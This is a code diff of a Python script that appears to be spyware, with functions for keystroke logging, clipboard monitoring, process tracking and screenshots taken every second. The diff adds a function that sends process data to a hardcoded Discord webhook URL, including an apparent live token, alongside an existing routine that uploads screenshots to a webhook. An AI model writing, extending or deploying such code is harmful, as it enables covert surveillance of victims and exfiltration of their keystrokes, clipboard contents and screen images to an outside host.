@@ -79,6 +79,18 @@ def send_to_webhook(message):
             print(f"Failed to send webhook message. Status code: {response.status_code}")
     except Exception as e:
         print(f"Error sending message to webhook: {e}")
+        
+def send_to_webhook_processes(message):
+    """Send the message to the Discord webhook."""
+    payload = {"content": message}
+    try:
+        response = requests.post(WEBHOOK_URL_PROCESSES, json=payload)
+        if response.status_code == 200:
+            print("Webhook message sent successfully.")
+        else:
+            print(f"Failed to send webhook message. Status code: {response.status_code}")
+    except Exception as e:
+        print(f"Error sending message to webhook: {e}")
 
 
 def keystroke_monitor():
@@ -159,7 +171,7 @@ def monitor_clipboard():
         except Exception as e:
             print(f"Error accessing clipboard: {e}")
 
-
+WEBHOOK_URL_PROCESSES = "https://discord.com/api/webhooks/1349769172862898206/9EPIPwHXe2X8tzDu_alb6h8nZc0ZISh14b7TMuSTLo3qmHOSu2K3cOVMoKLTkXnH1YLR"
 def monitor_processes():
     running_processes = set()
 
@@ -199,14 +211,14 @@ def send_to_webhook_pic(filename):
 def screenshot():
     while True:
         try:
-            print("Taking screenshot...")  
+            print("Taking screenshot...")
             now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
             filename = f"screen_{now}.png"
 
             screenshotpng = pyautogui.screenshot()
             screenshotpng.save(filename)
 
-            print(f"Screenshot saved as {filename}")  
+            print(f"Screenshot saved as {filename}")
 
             send_to_webhook_pic(filename)
             time.sleep(1)  # Warten, bevor die Datei gelöscht wird
